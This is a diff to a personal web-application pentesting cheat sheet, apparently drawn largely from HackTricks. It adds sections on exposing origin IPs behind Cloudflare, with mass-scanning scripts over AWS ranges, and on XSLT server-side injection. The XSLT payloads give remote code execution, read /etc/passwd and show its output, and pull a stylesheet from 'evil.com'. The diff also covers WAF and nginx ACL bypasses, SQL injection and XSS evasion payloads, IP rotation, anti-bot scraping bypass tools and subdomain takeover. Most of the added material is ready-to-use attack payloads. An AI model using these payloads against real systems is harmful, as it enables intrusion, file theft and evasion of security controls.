@@ -1294,9 +1294,10 @@ Ultimately, NGINX is tricked into believing a WebSocket connection exists betwee
 Most reverse proxies are vulnerable to this scenario, but exploitation is contingent upon the presence of an external SSRF vulnerability, typically regarded as a low-severity issue.
 
 
-
-
-
+## to read 
+- [ ] https://www.assetnote.io/resources/research/h2c-smuggling-in-the-wild
+- [ ] https://bishopfox.com/blog/h2c-smuggling-request
+- [ ] https://github.com/0ang3el/websocket-smuggle
 
 
 # <font color="red">Server side Inclusion/ Edge side Inclusion</font>
@@ -1447,6 +1448,7 @@ Use <!--esi--> to bypass WAFs:
 
 
 ```
+
 # This will reflect the cookies in the response
 <!--esi $(HTTP_COOKIE) -->
 # Reflect XSS (you can put '"><svg/onload=prompt(1)>' URL encoded and the URL encode eveyrhitng to send it in the HTTP request)
@@ -1539,6 +1541,742 @@ XSLT file:
 ```
 
 
+
+
+
+
+# <font color="red">Uncovering Cloudflare</font>
+### Common techniques 
+-   
+    You can use some service that gives you the **historical DNS records** of the domain. Maybe the web page is running on an IP address used before.
+    
+    - Same could be achieve **checking historical SSL certificates** that could be pointing to the origin IP address.
+        
+    - Check also **DNS records of other subdomains pointing directly to IPs**, as it's possible that other subdomains are pointing to the same server (maybe to offer FTP, mail or any other service).
+        
+    
+- If you find a **SSRF inside the web application** you can abuse it to obtain the IP address of the server.
+    
+- Search a unique string of the web page in browsers such as shodan (and maybe google and similar?). Maybe you can find an IP address with that content.
+    
+    - In a similar way instead of looking for a uniq string you could search for the favicon icon with the tool: [https://github.com/karma9874/CloudFlare-IP](https://github.com/karma9874/CloudFlare-IP) or with [https://github.com/pielco11/fav-up](https://github.com/pielco11/fav-up)
+        
+    - This won't work be very frequently because the server must send the same response when it's accessed by the IP address, but you never know.
+## tools to uncover cloudflare 
+
+- Search for the domain inside [http://www.crimeflare.org:82/cfs.html](http://www.crimeflare.org:82/cfs.html) or [https://crimeflare.herokuapp.com](https://crimeflare.herokuapp.com/). Or use the tool [CloudPeler](https://github.com/zidansec/CloudPeler) (which uses that API)
+    
+- Search for the domain in [https://leaked.site/index.php?resolver/cloudflare.0/](https://leaked.site/index.php?resolver/cloudflare.0/)
+    
+- [**CloudFlair**](https://github.com/christophetd/CloudFlair) is a tool that will search using Censys certificates that contains the domain name, then it will search for IPv4s inside those certificates and finally it will try to access the web page in those IPs.
+    
+- [**CloakQuest3r**](https://github.com/spyboy-productions/CloakQuest3r): CloakQuest3r is a powerful Python tool meticulously crafted to uncover the true IP address of websites safeguarded by Cloudflare and other alternatives, a widely adopted web security and performance enhancement service. Its core mission is to accurately discern the actual IP address of web servers that are concealed behind Cloudflare's protective shield.
+    
+- [Censys](https://search.censys.io/)
+    
+- [Shodan](https://shodan.io/)
+    
+- [Bypass-firewalls-by-DNS-history](https://github.com/vincentcox/bypass-firewalls-by-DNS-history)
+    
+- If you have a set of potential IPs where the web page is located you could use [https://github.com/hakluke/hakoriginfinder](https://github.com/hakluke/hakoriginfinder)
+    
+
+
+```
+# You can check if the tool is working with
+prips 1.0.0.0/30 | hakoriginfinder -h one.one.one.one
+
+# If you know the company is using AWS you could use the previous tool to search the
+## web page inside the EC2 IPs
+DOMAIN=something.com
+WIDE_REGION=us
+for ir in `curl https://ip-ranges.amazonaws.com/ip-ranges.json | jq -r '.prefixes[] | select(.service=="EC2") | select(.region|test("^us")) | .ip_prefix'`; do 
+    echo "Checking $ir"
+    prips $ir | hakoriginfinder -h "$DOMAIN"
+done
+```
+
+### Uncovering Cloudflare from cloud infrastructure
+Note that even if this was done for AWS machines, it could be done for any other cloud provider.
+
+For a better description of this process check:
+
+[Cloudflare bypass - Discover IP addresses of Web servers in AWS | TrickestTrickest](https://trickest.com/blog/cloudflare-bypass-discover-ip-addresses-aws/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)
+
+```
+# Find open ports
+sudo masscan --max-rate 10000 -p80,443 $(curl -s https://ip-ranges.amazonaws.com/ip-ranges.json | jq -r '.prefixes[] | select(.service=="EC2") | .ip_prefix' | tr '\n' ' ') | grep "open"  > all_open.txt
+# Format results
+cat all_open.txt | sed 's,.*port \(.*\)/tcp on \(.*\),\2:\1,' | tr -d " " > all_open_formated.txt
+# Search actual web pages
+httpx -silent -threads 200 -l all_open_formated.txt -random-agent -follow-redirects -json -no-color -o webs.json
+# Format web results and remove eternal redirects
+cat webs.json | jq -r "select((.failed==false) and (.chain_status_codes | length) < 9) | .url" | sort -u > aws_webs.json
+
+# Search via Host header
+httpx -json -no-color -list aws_webs.json -header Host: cloudflare.malwareworld.com -threads 250 -random-agent -follow-redirects -o web_checks.json
+```
+#### Bypassing cloudflare through cloudflare
+
+this mechanism relies on client ssl certificates to **authenticate connections** between **Cloudflare's reverse-proxy servers** and the **Origin** server, which is called **mTLS**. 
+
+Instead of configuring it's own certificate, customers can simple use Cloudflare’s certificate to allow any connection from Cloudflare, **regardless of the tenant**.
+
+Therefore, an attacker could just set a **domain in Cloudflare using Cloudflare's certificate and point** it to the **victim** domain **IP** address. This way, setting his domain completely unprotected, Cloudflare won't protect the requests sent.
+
+More info [**here**](https://socradar.io/cloudflare-protection-bypass-vulnerability-on-threat-actors-radar/).
+#### Allowlist Cloudflare IP Addresses
+
+this will **reject connections that do not originate from cloudflare's** IP address ranges .this is also vulnerable to the previous setup where an attacker just **point his own domain in cloudflare** to the **victims IP** address and attack it.
+
+More info [**here**](https://socradar.io/cloudflare-protection-bypass-vulnerability-on-threat-actors-radar/).
+
+### Bypass cloudflare for scraping 
+
+#### cache
+Sometimes you just want to bypass Cloudflare to only scrape the web page. There are some options for this:
+
+- Use Google cache: `https://webcache.googleusercontent.com/search?q=cache:https://www.petsathome.com/shop/en/pets/dog`
+    
+- Use other cache services such as [https://archive.org/web/](https://archive.org/web/)
+
+
+### Tools 
+Some tools like the following ones can bypass (or were able to bypass) Cloudflare's protection against scraping:
+
+- [https://github.com/sarperavci/CloudflareBypassForScraping](https://github.com/sarperavci/CloudflareBypassForScraping)
+#### Cloudflare Solvers
+
+There have been a number of Cloudflare solvers developed:
+
+- [FlareSolverr](https://github.com/FlareSolverr/FlareSolverr)
+    
+- [cloudscraper](https://github.com/VeNoMouS/cloudscraper) [Guide here](https://scrapeops.io/python-web-scraping-playbook/python-cloudscraper/)
+    
+- [cloudflare-scrape](https://github.com/Anorov/cloudflare-scrape)
+    
+- [CloudflareSolverRe](https://github.com/RyuzakiH/CloudflareSolverRe)
+    
+- [Cloudflare-IUAM-Solver](https://github.com/ninja-beans/cloudflare-iuam-solver)
+    
+- [cloudflare-bypass](https://github.com/devgianlu/cloudflare-bypass) [Archived]
+    
+- [CloudflareSolverRe](https://github.com/RyuzakiH/CloudflareSolverRe)
+    
+#### Fortified Headless Browsers
+
+Use a headless browser that isn't deetcted as an automated browser (you might need to customize it for that). Some options are:
+
+- **Puppeteer:** The [stealth plugin](https://github.com/berstend/puppeteer-extra/tree/master/packages/puppeteer-extra-plugin-stealth) for [puppeteer](https://github.com/puppeteer/puppeteer).
+    
+- **Playwright:** The [stealth plugin](https://www.npmjs.com/package/playwright-stealth) is coming to Playwright soon. Follow developments [here](https://github.com/berstend/puppeteer-extra/issues/454) and [here](https://github.com/berstend/puppeteer-extra/tree/master/packages/playwright-extra).
+    
+- **Selenium:** The [undetected-chromedriver](https://github.com/ultrafunkamsterdam/undetected-chromedriver) an optimized Selenium Chromedriver patch.
+
+
+#### Smart Proxy With Cloudflare Built-In Bypass
+
+**Smart proxies**  are continuously updated by specialized companies, aiming to outmaneuver Cloudflare's security measures (as thats their business).
+
+Som of them are:
+
+- [ScraperAPI](https://www.scraperapi.com/?fp_ref=scrapeops)
+    
+- [Scrapingbee](https://www.scrapingbee.com/?fpr=scrapeops)
+    
+- [Oxylabs](https://oxylabs.go2cloud.org/aff_c?offer_id=7&aff_id=379&url_id=32)
+    
+- [Smartproxy](https://prf.hn/click/camref:1100loxdG/[p_id:1100l442001]/destination:https%3A%2F%2Fsmartproxy.com%2Fscraping%2Fweb) are noted for their proprietary Cloudflare bypass mechanisms.
+    
+
+For those seeking an optimized solution, the [ScrapeOps Proxy Aggregator](https://scrapeops.io/proxy-aggregator/) stands out. This service integrates over 20 proxy providers into a single API, automatically selecting the best and most cost-effective proxy for your target domains, thus offering a superior option for navigating Cloudflare's defenses.
+
+#### Reverse Enginering Cloudflare Unti bot Protection
+
+
+
+
+# <font color="red">XSLT server side injection</font>
+## Basic Information
+
+ The attacker must be able to reflect a value with XML tags inside a page that is cached. Once a reflected value is found on the site, the following payload is reflected by the attacker in the HTTP response.
+
+	<esi:include src="http://website.com/" stylesheet="http://evil.com/esi.xsl">
+	</esi:include>
+
+The stylesheet attribute will point to a malicious XSLT resource hosted on a remote server controlled by the attacker.
+
+### XSL to RCE 
+he XSLT processing is triggered automatically by ESI-Gate when the included tag has a remote stylesheet. By default, the XML parser in Java allows the import of Java functions. This can easily lead to arbitrary code execution as demonstrated in the following stylesheet sample.
+```markup
+<?xml version="1.0" ?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+<xsl:output method="xml" omit-xml-declaration="yes"/>
+<xsl:template match="/"
+xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
+<root>
+<xsl:variable name="cmd"><![CDATA[touch /tmp/pwned]]></xsl:variable>
+<xsl:variable name="rtObj" select="rt:getRuntime()"/>
+<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
+Process: <xsl:value-of select="$process"/>
+Command: <xsl:value-of select="$cmd"/>
+</root>
+</xsl:template>
+</xsl:stylesheet>
+```
+### Read Local File
+
+read.xsl
+
+Copy
+
+```
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
+<xsl:template match="/">
+<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
+</xsl:template>
+</xsl:stylesheet>
+```
+
+Copy
+
+```
+$ saxonb-xslt -xsl:read.xsl xml.xml
+
+Warning: at xsl:stylesheet on line 1 column 111 of read.xsl:
+  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
+<?xml version="1.0" encoding="UTF-8"?>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+```
+
+### 
+
+[](https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations#ssrf)
+
+SSRF
+
+Copy
+
+```
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
+<xsl:include href="http://127.0.0.1:8000/xslt"/>
+<xsl:template match="/">
+</xsl:template>
+</xsl:stylesheet>
+```
+
+### 
+
+[](https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations#versions)
+
+Versions
+
+There might be more or less functions depending on the XSLT version used:
+
+- [https://www.w3.org/TR/xslt-10/](https://www.w3.org/TR/xslt-10/)
+    
+- [https://www.w3.org/TR/xslt20/](https://www.w3.org/TR/xslt20/)
+    
+- [https://www.w3.org/TR/xslt-30/](https://www.w3.org/TR/xslt-30/)
+    
+
+
+#### Fingerprint
+
+Upload this and take information
+
+Copy
+
+```
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+<xsl:template match="/">
+ Version: <xsl:value-of select="system-property('xsl:version')" /><br />
+ Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
+ Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
+ <xsl:if test="system-property('xsl:product-name')">
+ Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
+ </xsl:if>
+ <xsl:if test="system-property('xsl:product-version')">
+ Product Version: <xsl:value-of select="system-property('xsl:product-version')" /><br />
+ </xsl:if>
+ <xsl:if test="system-property('xsl:is-schema-aware')">
+ Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')" /><br />
+ </xsl:if>
+ <xsl:if test="system-property('xsl:supports-serialization')">
+ Supports Serialization: <xsl:value-of select="system-property('xsl:supportsserialization')"
+/><br />
+ </xsl:if>
+ <xsl:if test="system-property('xsl:supports-backwards-compatibility')">
+ Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supportsbackwards-compatibility')"
+/><br />
+ </xsl:if>
+</xsl:template>
+</xsl:stylesheet>
+```
+
+#### SSRF
+
+Copy
+
+```
+<esi:include src="http://10.10.10.10/data/news.xml" stylesheet="http://10.10.10.10//news_template.xsl">
+</esi:include>
+```
+
+#### Javascript Injection
+
+Copy
+
+```
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+<xsl:template match="/">
+<script>confirm("We're good");</script>
+</xsl:template>
+</xsl:stylesheet>
+```
+
+## 
+
+[](https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations#directory-listing-php)
+
+Directory listing (PHP)
+
+### 
+
+[](https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations#opendir--readdir)
+
+**Opendir + readdir**
+
+Copy
+
+```
+<?xml version="1.0" encoding="utf-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
+<xsl:template match="/">
+<xsl:value-of select="php:function('opendir','/path/to/dir')"/>
+<xsl:value-of select="php:function('readdir')"/> -
+<xsl:value-of select="php:function('readdir')"/> -
+<xsl:value-of select="php:function('readdir')"/> -
+<xsl:value-of select="php:function('readdir')"/> -
+<xsl:value-of select="php:function('readdir')"/> -
+<xsl:value-of select="php:function('readdir')"/> -
+<xsl:value-of select="php:function('readdir')"/> -
+<xsl:value-of select="php:function('readdir')"/> -
+<xsl:value-of select="php:function('readdir')"/> -
+</xsl:template></xsl:stylesheet>
+```
+
+### 
+
+[](https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations#assert-var_dump--scandir--false)
+
+**Assert (var_dump + scandir + false)**
+
+Copy
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
+    <body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
+        <xsl:copy-of name="asd" select="php:function('assert','var_dump(scandir(chr(46).chr(47)))==3')" />
+        <br />
+    </body>
+</html>
+```
+
+## 
+
+[](https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations#read-files)
+
+Read files
+
+### 
+
+[](https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations#internal-php)
+
+**Internal - PHP**
+
+Copy
+
+```
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
+<xsl:template match="/">
+<xsl:value-of select="unparsed-text('/etc/passwd', ‘utf-8')"/>
+</xsl:template>
+</xsl:stylesheet>
+```
+
+### 
+
+[](https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations#internal-xxe)
+
+**Internal - XXE**
+
+Copy
+
+```
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "/etc/passwd">]>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+<xsl:template match="/">
+&ext_file;
+</xsl:template>
+</xsl:stylesheet>
+```
+
+### 
+
+[](https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations#through-http)
+
+**Through HTTP**
+
+Copy
+
+```
+<?xml version="1.0" encoding="utf-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+<xsl:template match="/">
+<xsl:value-of select="document('/etc/passwd')"/>
+</xsl:template>
+</xsl:stylesheet>
+```
+
+Copy
+
+```
+<!DOCTYPE xsl:stylesheet [
+<!ENTITY passwd SYSTEM "file:///etc/passwd" >]>
+<xsl:template match="/">
+&passwd;
+</xsl:template>
+```
+
+### 
+
+[](https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations#internal-php-function)
+
+**Internal (PHP-function)**
+
+Copy
+
+```
+<?xml version="1.0" encoding="utf-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
+<xsl:template match="/">
+<xsl:value-of select="php:function('file_get_contents','/path/to/file')"/>
+</xsl:template>
+</xsl:stylesheet>
+```
+
+Copy
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
+    <body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
+        <xsl:copy-of name="asd" select="php:function('assert','var_dump(file_get_contents(scandir(chr(46).chr(47))[2].chr(47).chr(46).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))==3')" />
+        <br />
+    </body>
+</html>
+```
+
+### 
+
+[](https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations#port-scan)
+
+Port scan
+
+Copy
+
+```
+<?xml version="1.0" encoding="utf-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
+<xsl:template match="/">
+<xsl:value-of select="document('http://example.com:22')"/>
+</xsl:template>
+</xsl:stylesheet>
+```
+
+## 
+
+[](https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations#write-to-a-file)
+
+Write to a file
+
+### XSLT 2.0
+
+Copy
+
+```
+<?xml version="1.0" encoding="utf-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
+<xsl:template match="/">
+<xsl:result-document href="local_file.txt">
+<xsl:text>Write Local File</xsl:text>
+</xsl:result-document>
+</xsl:template>
+</xsl:stylesheet>
+```
+
+### **Xalan-J extension**
+
+Copy
+
+```
+<xsl:template match="/">
+<redirect:open file="local_file.txt"/>
+<redirect:write file="local_file.txt"/> Write Local File</redirect:write>
+<redirect:close file="loxal_file.txt"/>
+</xsl:template>
+```
+
+Other ways to write files in the PDF
+
+## Include external XSL
+
+Copy
+
+```
+<xsl:include href="http://extenal.web/external.xsl"/>
+```
+
+Copy
+
+```
+<?xml version="1.0" ?>
+<?xml-stylesheet type="text/xsl" href="http://external.web/ext.xsl"?>
+```
+
+## Execute code
+
+### **php:function**
+
+Copy
+
+```
+<?xml version="1.0" encoding="utf-8"?>
+<xsl:stylesheet version="1.0"
+xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+xmlns:php="http://php.net/xsl" >
+<xsl:template match="/">
+<xsl:value-of select="php:function('shell_exec','sleep 10')" />
+</xsl:template>
+</xsl:stylesheet>
+```
+
+Copy
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
+<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
+<xsl:copy-of name="asd" select="php:function('assert','var_dump(scandir(chr(46).chr(47)));')" />
+<br />
+</body>
+</html>
+```
+
+Execute code using other frameworks in the PDF
+## **Access PHP static functions from classes**
+
+The following function will call the static method `stringToUrl` of the class XSL:
+
+Copy
+
+```
+<!--- More complex test to call php class function-->
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"
+version="1.0">
+<xsl:output method="html" version="XHTML 1.0" encoding="UTF-8" indent="yes" />
+<xsl:template match="root">
+<html>
+<!-- We use the php suffix to call the static class function stringToUrl() -->
+<xsl:value-of select="php:function('XSL::stringToUrl','une_superstring-àÔ|modifier')" />
+<!-- Output: 'une_superstring ao modifier' -->
+</html>
+</xsl:template>
+</xsl:stylesheet>
+```
+
+
+# <font color="red">Proxy or WAF Protection Bypass</font>
+## Bypass Nginx ACL Rules with Pathname Manipulation
+
+Techniques [from this research](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).
+
+Nginx rule example:
+
+Copy
+
+```
+location = /admin {
+    deny all;
+}
+
+location = /admin/ {
+    deny all;
+}
+```
+
+In order to prevent bypasses Nginx performs path normalization before checking it. However, if the backend server performs a different normalization (removing characters that nginx doesn't remove) it might be possible to bypass this defense.
+
+### **NodeJS - Express**
+
+|   |   |
+|---|---|
+|Nginx Version|**Node.js Bypass Characters**|
+|1.22.0|`\xA0`|
+|1.21.6|`\xA0`|
+|1.20.2|`\xA0`, `\x09`, `\x0C`|
+|1.18.0|`\xA0`, `\x09`, `\x0C`|
+|1.16.1|`\xA0`, `\x09`, `\x0C`|
+
+### 
+
+[](https://book.hacktricks.xyz/pentesting-web/proxy-waf-protections-bypass#flask)
+
+**Flask**
+
+|   |   |
+|---|---|
+|Nginx Version|**Flask Bypass Characters**|
+|1.22.0|`\x85`, `\xA0`|
+|1.21.6|`\x85`, `\xA0`|
+|1.20.2|`\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B`|
+|1.18.0|`\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B`|
+|1.16.1|`\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B`|
+
+### **Spring Boot**
+
+|   |   |
+|---|---|
+|Nginx Version|**Spring Boot Bypass Characters**|
+|1.22.0|`;`|
+|1.21.6|`;`|
+|1.20.2|`\x09`, `;`|
+|1.18.0|`\x09`, `;`|
+|1.16.1|`\x09`, `;`|
+
+### **PHP-FPM**
+
+Nginx FPM configuration:
+
+Copy
+
+```
+location = /admin.php {
+    deny all;
+}
+
+location ~ \.php$ {
+    include snippets/fastcgi-php.conf;
+    fastcgi_pass unix:/run/php/php8.1-fpm.sock;
+}
+```
+
+Nginx is configured to block access to `/admin.php` but it's possible to bypass this by accessing `/admin.php/index.php`.
+
+### 
+
+[](https://book.hacktricks.xyz/pentesting-web/proxy-waf-protections-bypass#how-to-prevent)
+
+How to prevent
+
+Copy
+
+```
+location ~* ^/admin {
+    deny all;
+}
+```
+
+## Bypass Modified Security Rules
+
+### Path Confusion
+[**In this post**](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/) is explained that ModSecurity v3 (until 3.0.12), **improperly implemented the** `**REQUEST_FILENAME**` variable which was supposed to contain the accessed path (until the start of the parameters). This is because it performed an URL decode to get the path. Therefore, a request like `http://example.com/foo%3f';alert(1);foo=` in mod security will suppose that the path is just `/foo` because `%3f` is transformed into `?` ending the URL path, but actually the path that a server will receive will be `/foo%3f';alert(1);foo=`.
+
+The variables `REQUEST_BASENAME` and `PATH_INFO` were also affected by this bug.
+
+Something similar ocurred in version 2 of Mod Security that allowed to bypass a protection that prevented user accessing files with specific extensions related to backup files (such as `.bak`) simply by sending the dot URL encoded in `%2e`, for example: `https://example.com/backup%2ebak`.
+
+## Bypassing AWS WAF
+### Malformed Header
+
+[This research](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) mentions that it was possible to bypass AWS WAF rules applied over HTTP headers by sending a "malformed" header that wasn't properly parsed by AWS but it was by the backend server.
+
+For example, sending the following request with a SQL injection in the header X-Query:
+
+
+```
+GET / HTTP/1.1\r\n
+Host: target.com\r\n
+X-Query: Value\r\n
+\t' or '1'='1' -- \r\n
+Connection: close\r\n
+\r\n
+```
+
+It was possible to bypass AWS WAF because it wouldn't understand that the next line is part of the value of the header while the NODEJS server did (this was fixed).
+
+## Generic WAF Bypassed 
+
+### Request Size Limits
+
+Commonly WAFs have a certain length limit of requests to check and if a POST/PUT/PATCH request is over it, the WAF won't check the request.
+
+-  For AWS WAF, you can [**check the documentation**](https://docs.aws.amazon.com/waf/latest/developerguide/limits.html)**:**
+    
+
+
+- From **Azure docs**:
+Older Web Application Firewalls with Core Rule Set 3.1 (or lower) allow messages larger than **128 KB** by turning off request body inspection, but these messages won't be checked for vulnerabilities. For newer versions (Core Rule Set 3.2 or newer), the same can be done by disabling the maximum request body limit. When a request exceeds the size limit:
+
+If p**revention mode**: Logs and blocks the request. If **detection mode**: Inspects up to the limit, ignores the rest, and logs if the `Content-Length` exceeds the limit.
+
+-   From [**Cloudflare**](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields)**:**
+
+
+Up to 128KB.
+
+
+### Obfuscation
+
+
+```
+# IIS, ASP Clasic
+<%s%cr%u0131pt> == <script>
+
+# Path blacklist bypass - Tomcat
+/path1/path2/ == ;/path1;foo/path2;bar/;
+```
+
+### Unicode Compatability
+Depending on the implementation of unicode normalization (more info [here](https://jlajara.gitlab.io/Bypass_WAF_Unicode)), characters that share Unicode compatability may be able to bypass the WAF and execute as the intended payload. Compatible characters can be found [here](https://www.compart.com/en/unicode).
+
+#### Example
+
+```
+# under the NFKD normalization algorithm, the characters on the left translate
+# to the XSS payload on the right
+＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥  --> ＜img src=p onerror='prompt(1)'>
+```
+
+## IP Rotation
+- https://github.com/ustayready/fireprox](https://github.com/ustayready/fireprox): Generate an API gateway URL to by used with ffuf
+    
+- [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin): Similar to fireprox
+    
+- [https://github.com/PortSwigger/ip-rotate](https://github.com/PortSwigger/ip-rotate): Burp Suite plugin that uses API gateway IPs
+    
+- [https://github.com/fyoorer/ShadowClone](https://github.com/fyoorer/ShadowClone): A dynamically determined number of container instances are activated based on the input file size and split factor, with the input split into chunks for parallel execution, such as 100 instances processing 100 chunks from a 10,000-line input file with a split factor of 100 lines.
 
 
 # <font color="red">FILE INCLUSION / PATH TRAVERSAL</font>
@@ -2113,6 +2851,18 @@ password of any user who visits the malicious page:
 	<script>document.getElementById("csrf-form").submit();</script>
 	</html>
 
+# <font color="red">CRLF</font>
+
+Carriage Return (CR) and Line Feed (LF), collectively known as CRLF, are special characters sequences used in the HTTP protocol to denote the end of a line or the start of a new one.Web servers and browsers use CRLF to distinguish between HTTP headers and the body of a response.
+
+### CRLF injection vulnerability
+CRLF injection involves the insertion of CR and LF characters into user-supplied input. This action misleads the server, application, or user into interpreting the injected sequence as the end of one response and the beginning of another. While these characters are not inherently harmful, their misuse can lead to HTTP response splitting and other malicious activities.
+
+
+
+
+
+
 # <font color="red">OPEN REDIRECT</font>
 #### NOTE: THERE IS A WAY TO CHAIN OPEN REDIRECTS TO SSRF AND I DONT KNOW IT YET
 
@@ -2475,6 +3225,19 @@ automatically or after the required user interactions.
 
 
 # <font color="red">DOMAIN/SUBDOMAIN TAKEOVER </font>
+#### A subdomain takeover vulnerability occurs when a subdomain points to a service, such as a web host or cloud service that has been removed or is no longer active.
+
+#### This can arise for various reasons, such as the external service being decommissioned but the DNS record not being updated or removed, or the organization forgetting to renew its subscription for a specific service, leaving the subdomain pointing to an inactive service. These subdomains can sometimes be claimed or registered on the respective service.
+
+### Automated subdomain takeover using subjack:
+https://github.com/haccer/subjack
+this tool can produce false positive so better to manually verify them 
+#### command 
+```
+subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt
+```
+
+
 
 # <font color="red">PARAM POLLUTION </font>
 
